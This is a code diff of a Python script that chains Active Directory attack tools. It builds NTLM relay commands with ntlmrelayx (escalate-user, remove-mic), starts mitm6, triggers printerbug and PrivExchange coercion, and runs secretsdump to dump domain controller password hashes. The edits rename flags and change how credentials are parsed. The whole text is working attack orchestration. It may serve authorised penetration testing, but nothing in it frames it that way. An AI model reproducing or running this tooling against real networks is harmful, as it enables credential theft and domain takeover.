@@ -15,11 +15,11 @@ def create_ntlmrelayx_cmd(args):
     relay_cmd = f'python {cwd}/tools/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
 
     # PrinterBug/PrivExchange
-    if args.privexchange or args.printerbug:
-        dom, user, pw = parse_creds(args)
+    if args.privexchange or args.remove_mic:
+        dom, user, pw = parse_creds(args.user)
         relay_cmd += f' --escalate-user {user} -t ldap://{args.domain_controller}'
         # PrinterBug
-        if args.printerbug:
+        if args.remove_mic:
             relay_cmd += ' --remove-mic'
 
     # Authenticationless PrivExchange
@@ -107,7 +107,7 @@ def start_mitm6(args):
 
     return mitm6
 
-def start_printerbug_scan(args):
+def start_mic_scan(args):
     if args.server_file:
         with open(args.server_file, "r") as f:
             target = f.readlines()[0].strip()
@@ -121,22 +121,22 @@ def start_printerbug_scan(args):
 
     return scan
 
-def start_printerbug(dom_user_pw, attack_server, local_ip):
-    cmd = f"python {cwd}/tools/krbrelayx/printerbug.py {dom_user_pw}@{attack_server} {local_ip}"
+def start_printerbug(args, attack_server, local_ip):
+    cmd = f"python {cwd}/tools/krbrelayx/printerbug.py {args.user}@{attack_server} {local_ip}"
     name = 'printerbug'
     printerbug = start_process(cmd, name)
 
     return printerbug
 
 def start_privexchange(args, local_ip):
-    dom, user, passwd = parse_creds(args)
+    dom, user, passwd = parse_creds(args.user)
     cmd = f'python {cwd}/tools/PrivExchange/privexchange.py -ah {local_ip} -u {user} -p {passwd} -d {dom} {args.server}'
     name = 'privexchange'
     privexchange = start_process(cmd, name)
     return privexchange
 
 def start_secretsdump(args):
-    dom, user, passwd = parse_creds(args)
+    dom, user, passwd = parse_creds(args.user)
     cmd = f'python {cwd}/tools/impacket/examples/secretsdump.py {dom}/{user}:{passwd}@{args.domain_controller} -just-dc'
     name = 'secretsdump'
     secretsdump = start_process(cmd, name, live_output=True)
